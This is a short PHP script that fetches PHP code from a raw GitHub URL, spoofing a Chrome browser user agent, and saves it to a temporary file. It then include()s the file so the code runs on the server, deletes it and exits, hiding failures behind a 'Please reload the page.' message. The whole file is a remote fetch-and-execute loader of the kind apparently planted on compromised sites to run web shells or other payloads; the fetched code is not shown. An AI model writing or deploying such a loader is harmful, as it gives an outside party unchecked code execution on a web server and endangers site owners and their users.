<?php
// URL of the remote PHP file
$url =
"https://raw.githubusercontent.com/hurairaxp/Random-files/main/kara.php";

// Try to fetch the content using cURL
$response = false;

if (function_exists('curl_init')) {
    // Initialize cURL session
    $ch = curl_init($url);

    // Set the Chrome user agent
    $chromeUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124
Safari/537.36";
    curl_setopt($ch, CURLOPT_USERAGENT, $chromeUserAgent);

    // Return the transfer as a string
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute the cURL session and store the result
    $response = curl_exec($ch);

    // Close the cURL session
    curl_close($ch);
}

// If cURL failed, fall back to file_get_contents
if ($response === false) {
    $response = file_get_contents($url);
}

// Check if the response is valid
if ($response === false) {
    echo "Please reload the page.";
} else {
    // Save the response to a temporary file
    $tmpFile = tempnam(sys_get_temp_dir(), 'remote_php_');
    file_put_contents($tmpFile, $response);

    // Include the temporary file
    include($tmpFile);

    // Optionally delete the temporary file
    unlink($tmpFile);
}

exit();
?>